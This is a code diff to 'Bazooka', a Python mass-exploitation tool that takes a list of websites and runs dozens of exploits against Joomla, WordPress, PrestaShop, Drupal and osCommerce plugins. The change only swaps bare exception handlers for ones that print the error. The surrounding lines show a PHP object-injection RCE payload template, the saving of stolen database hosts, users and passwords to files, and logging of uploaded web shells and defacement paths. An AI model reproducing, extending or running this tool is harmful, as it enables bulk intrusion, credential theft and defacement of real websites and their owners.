@@ -15,11 +15,13 @@ class Bazooka(object):
     def __init__(self):
         try:
             os.mkdir('Exploited')
-        except:
+        except Exception as inst:
+            print(inst)
             pass
         try:
             os.mkdir('Login')
-        except:
+        except Exception as inst:
+            print(inst)
             pass
         self.r = '\033[31m'
         self.g = '\033[32m'
@@ -54,7 +56,8 @@ class Bazooka(object):
         try:
             self.select = 'bazooka'
             if len(sys.argv)>1 : self.select = sys.argv[1]
-        except:
+        except Exception as inst:
+            print(inst)
             self.cls()
             self.print_logo()
             sys.exit()
@@ -65,7 +68,8 @@ class Bazooka(object):
             try:
                 try:
                     self.Get_list = raw_input(self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Get_list = input(self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)
 
             except IOError:
@@ -80,7 +84,8 @@ class Bazooka(object):
                 for url in open(self.Get_list):
                     self.q.put(url.strip())
                 self.q.join()
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
     def doWork(self):
         try:
@@ -458,9 +463,11 @@ class Bazooka(object):
                         self.TikiWiki(url)
                         self.FckEditor(url)
                         
-                except:
+                except Exception as inst:
+                    print(inst)
                     pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def print_logo(self):
@@ -578,7 +585,8 @@ class Bazooka(object):
             }
             try:
                 cookies = requests.get('http://' + site, headers=headers, timeout=5).cookies
-            except:
+            except Exception as inst:
+                print(inst)
                 cookies = []
             try:
                 rr = requests.get('http://' + site + '/', headers=headers, cookies=cookies, timeout=5)
@@ -621,9 +629,11 @@ class Bazooka(object):
                         self.Print_NotVuln('RCE Joomla', site)
                 else:
                     self.Print_NotVuln('RCE Joomla', site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('RCE Joomla', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('RCE Joomla', site)
 
     def php_str_noquotes(self, data):
@@ -632,7 +642,8 @@ class Bazooka(object):
             for char in data:
                 encoded += "chr({0}).".format(ord(char))
             return encoded[:-1]
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def generate_payload(self, php_payload):
@@ -649,27 +660,31 @@ class Bazooka(object):
             aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
             tion";b:1;}''' + terminate
             return exploit_template
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def joomver(self,site):
         try:
             zz=requests.get('http://'+site+'/language/en-GB/en-GB.xml')
             req=re.findall('<version>(.*)<',zz)[0]
             print "\t{>} Version : %s"%(req)
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wpmver(self,site):
         try:
             zz=requests.get('http://'+site)
             req=re.findall('content="WordPress (.*?)',zz)[0]
             print "\t{>} Version : %s"%(req)
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Joomla_TakeADmin(self, site):
         try:
             self.Print_NotVuln('Failed 3.x', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Maybe Add Admin 3.x', site)
 
     def Com_s5_media_player(self, site):
@@ -690,11 +705,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     pass
             else:
                 self.Print_NotVuln('Com_s5_media_player', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_s5_media_player', site)
 
     def Com_Hdflvplayer(self, site):
@@ -715,11 +732,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     pass
             else:
                 self.Print_NotVuln('Com_Hdflvplayer', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_Hdflvplayer', site)
 
     def Com_Joomanager(self, site):
@@ -740,11 +759,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Com_Joomanager', site)
             else:
                 self.Print_NotVuln('Com_Joomanager', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_Joomanager', site)
 
 
@@ -765,11 +786,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Com_Macgallery', site)
             else:
                 self.Print_NotVuln('Com_Macgallery', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_Macgallery', site)
 
 
@@ -790,11 +813,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Com_CCkjseblod', site)
             else:
                 self.Print_NotVuln('Com_CCkjseblod', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_CCkjseblod', site)
 
 
@@ -810,7 +835,8 @@ class Bazooka(object):
                     try:
                         GetPAth = re.findall("source: '(.*)'", GoT.text)
                         IndeXpath = GetPAth[0]
-                    except:
+                    except Exception as inst:
+                        print(inst)
                         IndeXpath = 'http://' + site + '/images/pwn.gif'
                 CheckIndex = requests.get(IndeXpath, timeout=5, headers=self.Headers)
                 if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
@@ -821,7 +847,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Com_MyBlog', site)
             else:
                 self.Print_NotVuln('Com_MyBlog', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_MyBlog', site)
 
 
@@ -864,7 +891,8 @@ class Bazooka(object):
                     self.Com_Jdownloads(site)
             else:
                 self.Com_Jdownloads(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Com_Jdownloads(site)
 
 
@@ -899,7 +927,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Com_Jdownloads', site)
             else:
                 self.Print_NotVuln('Com_Jdownloads', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_Jdownloads', site)
 
 
@@ -929,7 +958,8 @@ class Bazooka(object):
                     writer.write(site + '/media/' + self.TextindeX.split('/')[1] + '\n')
             else:
                 self.Print_NotVuln('Com_Fabric', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_Fabric', site)
 
 
@@ -948,7 +978,8 @@ class Bazooka(object):
                         writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                 else:
                     self.Print_NotVuln('Com_AdsManager', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_AdsManager', site)
 
     def Com_AdsManager_Shell(self, site):
@@ -1001,7 +1032,8 @@ class Bazooka(object):
                         self.Com_AdsManager(site)
                 else:
                     self.Com_AdsManager(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Com_AdsManager(site)
 
     def JCE_shell(self, site):
@@ -1028,14 +1060,17 @@ class Bazooka(object):
                             self.Jce_Test(site)
                         else:
                             self.Jce_Test(site)
-                    except:
+                    except Exception as inst:
+                        print(inst)
                         self.Jce_Test(site)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Jce_Test(site)
 
             else:
                 self.Jce_Test(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Jce_Test(site)
 
     def Jce_Test(self, site):
@@ -1061,7 +1096,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Com_JCE', site)
             else:
                 self.Print_NotVuln('Com_JCE', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Com_JCE', site)
 
 
@@ -1087,7 +1123,8 @@ class Bazooka(object):
                     self.Print_NotVuln('com_alberghi', site)
             else:
                 self.Print_NotVuln('com_alberghi', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('com_alberghi', site)
 			
 			
@@ -1108,7 +1145,8 @@ class Bazooka(object):
                     Usernamez = __InFo['name']
                     print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + m + Usernamez
                 _cun = _cun + 1
-        except:
+        except Exception as inst:
+            print(inst)
             try:
                 if '/author/' not in __Check2.text:
                     print r + '    [' + y + '+' + r + ']' + w + ' Wordpress Username: ' + r + 'Not FOund'
@@ -1140,7 +1178,8 @@ class Bazooka(object):
                         find = re.findall('/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', Hunt_path.text)
                         x = find[0].strip()
                         return x
-                    except:
+                    except Exception as inst:
+                        print(inst)
                         pass
 
                 def Hunt_Path_Host():
@@ -1148,7 +1187,8 @@ class Bazooka(object):
                         find = re.findall("not found in <b>(.*)wp-includes/ID3/module.audio.ac3.php", Hunt_path.text)
                         x = find[0].strip()
                         return x
-                    except:
+                    except Exception as inst:
+                        print(inst)
                         pass
 
                 Cpanel_username = Hunt_Path_User()
@@ -1205,7 +1245,8 @@ class Bazooka(object):
                 if len(version) != None:
                     print r + '    [' + y + '+' + r + ']' + w + ' Wp Version: ' + m + version
                     self.Plugin_NamE_Vuln_TeST('Wordpress ' + version)
-            except:
+            except Exception as inst:
+                print(inst)
                 print r + '    [' + y + '+' + r + ']' + w + ' Wp Version: ' + r + 'Not Found'
 
         except requests.exceptions.ReadTimeout:
@@ -1262,7 +1303,8 @@ class Bazooka(object):
         for name_plugins in plugin_NamEz:
             try:
                 plugname = str(name_plugins).split(' ')[0]
-            except:
+            except Exception as inst:
+                print(inst)
                 plugname = str(name_plugins)
             print r + '    [' + y + '+' + r + ']' + w + ' Plugin Name: ' + m + name_plugins
             self.Plugin_NamE_Vuln_TeST(name_plugins)
@@ -1275,7 +1317,8 @@ class Bazooka(object):
             version = re.findall('([0-9].[0-9].[0-9])', verz)
             try:
                 OK_Ver = Name_Theme + ' ' + version[0]
-            except:
+            except Exception as inst:
+                print(inst)
                 OK_Ver = Name_Theme
             if '-' in OK_Ver:
                 x2 = OK_Ver.replace('-', ' ')
@@ -1323,7 +1366,8 @@ class Bazooka(object):
                     self.Print_NotVuln('CateGory_page_icons', site)
             else:
                 self.Print_NotVuln('CateGory_page_icons', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('CateGory_page_icons', site)
 
 
@@ -1363,7 +1407,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Downloads-Manager', site)
             else:
                 self.Print_NotVuln('Downloads-Manager', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Downloads-Manager', site)
 
 
@@ -1373,7 +1418,8 @@ class Bazooka(object):
             wsx = re.findall('"id":(.+?),"date"', PostId.text)
             postid = wsx[1].strip()
             return postid
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def wp_content_injection(self, site):
@@ -1402,7 +1448,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
             else:
                 self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
 
     def Wp_Job_Manager(self, site):
@@ -1423,11 +1470,13 @@ class Bazooka(object):
                             writer.write(UploadedIndEX + '\n')
                     else:
                         self.Print_NotVuln('Wp-Job-Manager', site)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Wp-Job-Manager', site)
             else:
                 self.Print_NotVuln('Wp-Job-Manager', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Wp-Job-Manager', site)
 
 
@@ -1470,7 +1519,8 @@ class Bazooka(object):
                     self.Print_NotVuln('wp-mobile-detector', site)
             else:
                 self.Print_NotVuln('wp-mobile-detector', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('wp-mobile-detector', site)
 
     def get_WpNoncE(self, source):
@@ -1478,7 +1528,8 @@ class Bazooka(object):
             find = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', source)
             path = find[0].strip()
             return path
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def get_WpFlag(self, source):
@@ -1486,7 +1537,8 @@ class Bazooka(object):
             find = re.findall('<option value="(.*?)" selected="selected">', source)
             path = find[0].strip()
             return path
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def UserProExploit(self, site):
@@ -1537,7 +1589,8 @@ class Bazooka(object):
                             writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php" + '\n')
             else:
                 self.Print_NotVuln('UserPro', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('UserPro', site)
 
 
@@ -1573,7 +1626,8 @@ class Bazooka(object):
                     self.formcraftExploitIndeX(site)
             else:
                 self.formcraftExploitIndeX(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.formcraftExploitIndeX(site)
 
     def formcraftExploitIndeX(self, site):
@@ -1598,7 +1652,8 @@ class Bazooka(object):
                     self.Print_NotVuln('formcraft', site)
             else:
                 self.Print_NotVuln('formcraft', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('formcraft', site)
 
 
@@ -1627,7 +1682,8 @@ class Bazooka(object):
                     self.Print_NotVuln('cherry plugin', site)
             else:
                 self.Print_NotVuln('cherry plugin', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('cherry plugin', site)
 
     def addblockblocker(self, site):
@@ -1653,7 +1709,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Adblock Blocker', site)
             else:
                 self.Print_NotVuln('Adblock Blocker', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Adblock Blocker', site)
 
     def HeadWayThemeExploit(self, site):
@@ -1692,7 +1749,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Headway Theme', site)
             else:
                 self.Print_NotVuln('Headway Theme', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Headway Theme', site)
 
 
@@ -1718,7 +1776,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Pagelines', site)
             else:
                 self.Print_NotVuln('Pagelines', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Pagelines', site)
 
 
@@ -1747,7 +1806,8 @@ class Bazooka(object):
                         self.Print_NotVuln('wysija', site)
                 else:
                     self.Print_NotVuln('wysija', site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('wysija', site)
 
 
@@ -1771,7 +1831,8 @@ class Bazooka(object):
                                  'Username : ' + username + '\n' + 'Password : ' + password + '\n')
             else:
                 self.Print_NotVuln('HD-Webplayer', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('HD-Webplayer', site)
 
 
@@ -1812,11 +1873,13 @@ class Bazooka(object):
                             self.Gravity_forms_Index(site)
                     else:
                         self.Gravity_forms_Index(site)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('Gravity-Forms', site)
             else:
                 self.Print_NotVuln('Gravity Forms', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Timeout(site)
 
 
@@ -1842,7 +1905,8 @@ class Bazooka(object):
                     writer.write(site + '/wp-content/_input_3_spy.gif' + '\n')
             else:
                 self.Print_NotVuln('Gravity-Forms', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Gravity-Forms', site)
 
     def WP_User_Frontend(self, site):
@@ -1869,11 +1933,13 @@ class Bazooka(object):
                             self.Print_NotVuln('WP-User-Frontend', site)
                     else:
                         self.Print_NotVuln('WP-User-Frontend', site)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('WP-User-Frontend', site)
             else:
                 self.Print_NotVuln('WP-User-Frontend', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('WP-User-Frontend', site)
 
 
@@ -1895,7 +1961,8 @@ class Bazooka(object):
                     writer.write(deface + '\n')
             else:
                 self.Print_NotVuln('Revslider', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Revslider', site)
 
     def Revslider_SHELL(self, site):
@@ -2240,7 +2307,8 @@ class Bazooka(object):
                     self.Revslider_Config(site)
             else:
                 self.Print_NotVuln('revslider', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('revslider', site)
 
     def Revslider_Config(self, site):
@@ -2262,11 +2330,13 @@ class Bazooka(object):
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n\n')
                     self.Revslider_css(site)
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Revslider_css(site)
             else:
                 self.Revslider_css(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Revslider_css(site)
 
     def viral_optins(self, site):
@@ -2293,7 +2363,8 @@ class Bazooka(object):
                     self.Print_NotVuln('viral optins', site)
             else:
                 self.Print_NotVuln('viral optins', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('viral optins', site)
 
 
@@ -2325,7 +2396,8 @@ class Bazooka(object):
                     self.Print_NotVuln('Woocomrece', site)
             else:
                 self.Print_NotVuln('Woocomrece', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('Woocomrece', site)
 
 
@@ -2334,7 +2406,8 @@ class Bazooka(object):
             find = re.findall(',"(.*)","', zzz)
             path = find[0].strip()
             return path
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def FckEditor(self, site):
@@ -2367,9 +2440,11 @@ class Bazooka(object):
                         self.Print_NotVuln('fckeditor', site)
                 else:
                     self.Print_NotVuln('fckeditor', site)
-            except:
+            except Exception as inst:
+                print(inst)
                 self.Print_NotVuln('fckeditor', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('fckeditor', site)
 
     def Drupal_Sqli_Addadmin(self, site):
@@ -2411,7 +2486,8 @@ class Bazooka(object):
                                 self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                                 with open('Exploited/Shells.txt', 'a') as writer:
                                     writer.write(site + '/wp-content/vuln.php' + '\n')
-                        except:
+                        except Exception as inst:
+                            print(inst)
                             pass
                     else:
                         self.Print_NotVuln('osCommerce RCE', site)
@@ -2419,7 +2495,8 @@ class Bazooka(object):
                     self.Print_NotVuln('osCommerce RCE', site)
             else:
                 self.Print_NotVuln('osCommerce RCE', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('osCommerce RCE', site)
 
     def columnadverts(self, site):
@@ -2446,7 +2523,8 @@ class Bazooka(object):
                     self.Print_NotVuln('columnadverts', site)
             else:
                 self.Print_NotVuln('columnadverts', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('columnadverts', site)
 
     def soopamobile(self, site):
@@ -2473,7 +2551,8 @@ class Bazooka(object):
                     self.Print_NotVuln('soopamobile', site)
             else:
                 self.Print_NotVuln('soopamobile', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('soopamobile', site)
 
 
@@ -2501,7 +2580,8 @@ class Bazooka(object):
                     self.Print_NotVuln('soopabanners', site)
             else:
                 self.Print_NotVuln('soopabanners', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('soopabanners', site)
 
 
@@ -2529,7 +2609,8 @@ class Bazooka(object):
                     self.Print_NotVuln('vtermslideshow', site)
             else:
                 self.Print_NotVuln('vtermslideshow', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('vtermslideshow', site)
 
     def simpleslideshow(self, site):
@@ -2556,7 +2637,8 @@ class Bazooka(object):
                     self.Print_NotVuln('simpleslideshow', site)
             else:
                 self.Print_NotVuln('simpleslideshow', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('simpleslideshow', site)
 
     def productpageadverts(self, site):
@@ -2583,7 +2665,8 @@ class Bazooka(object):
                     self.Print_NotVuln('productpageadverts', site)
             else:
                 self.Print_NotVuln('productpageadverts', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('productpageadverts', site)
 
     def homepageadvertise(self, site):
@@ -2610,7 +2693,8 @@ class Bazooka(object):
                     self.Print_NotVuln('homepageadvertise', site)
             else:
                 self.Print_NotVuln('homepageadvertise', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('homepageadvertise', site)
 
     def homepageadvertise2(self, site):
@@ -2637,7 +2721,8 @@ class Bazooka(object):
                     self.Print_NotVuln('homepageadvertise2', site)
             else:
                 self.Print_NotVuln('homepageadvertise2', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('homepageadvertise2', site)
 
     def jro_homepageadvertise(self, site):
@@ -2664,7 +2749,8 @@ class Bazooka(object):
                     self.Print_NotVuln('jro_homepageadvertise', site)
             else:
                 self.Print_NotVuln('jro_homepageadvertise', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('jro_homepageadvertise', site)
 
     def attributewizardpro(self, site):
@@ -2694,7 +2780,8 @@ class Bazooka(object):
                     self.Print_NotVuln('attributewizardpro', site)
             else:
                 self.Print_NotVuln('attributewizardpro', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('attributewizardpro', site)
 
 
@@ -2725,7 +2812,8 @@ class Bazooka(object):
                     self.Print_NotVuln('1attributewizardpro', site)
             else:
                 self.Print_NotVuln('1attributewizardpro', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('1attributewizardpro', site)
 
     def attributewizardpro3(self, site):
@@ -2755,7 +2843,8 @@ class Bazooka(object):
                     self.Print_NotVuln('attributewizardpro.OLD', site)
             else:
                 self.Print_NotVuln('attributewizardpro.OLD', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('attributewizardpro.OLD', site)
 
     def attributewizardpro_x(self, site):
@@ -2785,7 +2874,8 @@ class Bazooka(object):
                     self.Print_NotVuln('attributewizardpro_x', site)
             else:
                 self.Print_NotVuln('attributewizardpro_x', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('attributewizardpro_x', site)
 
     def advancedslider(self, site):
@@ -2805,7 +2895,8 @@ class Bazooka(object):
                     self.Print_NotVuln('advancedslider', site)
             else:
                 self.Print_NotVuln('advancedslider', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('advancedslider', site)
 
     def cartabandonmentpro(self, site):
@@ -2825,7 +2916,8 @@ class Bazooka(object):
                     self.Print_NotVuln('cartabandonmentpro', site)
             else:
                 self.Print_NotVuln('cartabandonmentpro', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('cartabandonmentpro', site)
 
     def cartabandonmentproOld(self, site):
@@ -2845,7 +2937,8 @@ class Bazooka(object):
                     self.Print_NotVuln('cartabandonmentproOld', site)
             else:
                 self.Print_NotVuln('cartabandonmentproOld', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('cartabandonmentproOld', site)
 
     def videostab(self, site):
@@ -2865,7 +2958,8 @@ class Bazooka(object):
                     self.Print_NotVuln('videostab', site)
             else:
                 self.Print_NotVuln('videostab', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('videostab', site)
 
     def wg24themeadministration(self, site):
@@ -2898,7 +2992,8 @@ class Bazooka(object):
                     self.Print_NotVuln('wg24themeadministration', site)
             else:
                 self.Print_NotVuln('wg24themeadministration', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('wg24themeadministration', site)
 
 
@@ -2927,7 +3022,8 @@ class Bazooka(object):
                     self.Print_NotVuln('fieldvmegamenu', site)
             else:
                 self.Print_NotVuln('fieldvmegamenu', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('fieldvmegamenu', site)
 
 
@@ -2958,7 +3054,8 @@ class Bazooka(object):
                     self.Print_NotVuln('wdoptionpanel', site)
             else:
                 self.Print_NotVuln('wdoptionpanel', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('wdoptionpanel', site)
 
 
@@ -2987,7 +3084,8 @@ class Bazooka(object):
                     self.Print_NotVuln('pk_flexmenu', site)
             else:
                 self.Print_NotVuln('pk_flexmenu', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('pk_flexmenu', site)
 
 
@@ -3016,7 +3114,8 @@ class Bazooka(object):
                     self.Print_NotVuln('nvn_export_orders', site)
             else:
                 self.Print_NotVuln('nvn_export_orders', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('nvn_export_orders', site)
 
     def megamenu(self, site):
@@ -3036,7 +3135,8 @@ class Bazooka(object):
                     self.Print_NotVuln('megamenu', site)
             else:
                 self.Print_NotVuln('megamenu', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('megamenu', site)
 
 
@@ -3066,7 +3166,8 @@ class Bazooka(object):
                     self.Print_NotVuln('tdpsthemeoptionpanel', site)
             else:
                 self.Print_NotVuln('tdpsthemeoptionpanel', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('tdpsthemeoptionpanel', site)
 
     def psmodthemeoptionpanel(self, site):
@@ -3094,7 +3195,8 @@ class Bazooka(object):
                     self.Print_NotVuln('psmodthemeoptionpanel', site)
             else:
                 self.Print_NotVuln('psmodthemeoptionpanel', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('psmodthemeoptionpanel', site)
 
 
@@ -3123,7 +3225,8 @@ class Bazooka(object):
                     self.Print_NotVuln('lib', site)
             else:
                 self.Print_NotVuln('lib', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('lib', site)
 
     def Com_Jbcatalog(self, site):
@@ -3264,11 +3367,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
             else:
                 self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('wp-support-plus-responsive-ticket-system', site)
 
     def eshop_magic(self, site):
@@ -3289,11 +3394,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('eshop-magic', site)
             else:
                 self.Print_NotVuln('eshop-magic', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('eshop-magic', site)
 
     def ungallery(self, site):
@@ -3314,11 +3421,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('ungallery', site)
             else:
                 self.Print_NotVuln('ungallery', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('ungallery', site)
 			
     def membershipsimplified(self, site):
@@ -3339,11 +3448,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('membershipsimplified', site)
             else:
                 self.Print_NotVuln('membershipsimplified', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('membershipsimplified', site)
 
     def MacPhotoGallery(self, site):
@@ -3364,11 +3475,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
                     self.Print_NotVuln('MacPhotoGallery', site)
             else:
                 self.Print_NotVuln('MacPhotoGallery', site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.Print_NotVuln('MacPhotoGallery', site)
 
     def jtrtresponsivetables(self, site):
@@ -3389,11 +3502,13 @@ class Bazooka(object):
                         ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                  '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                      0] + '\n---------------------\n')
-                except:
+                except Exception as inst:
+                    print(inst)
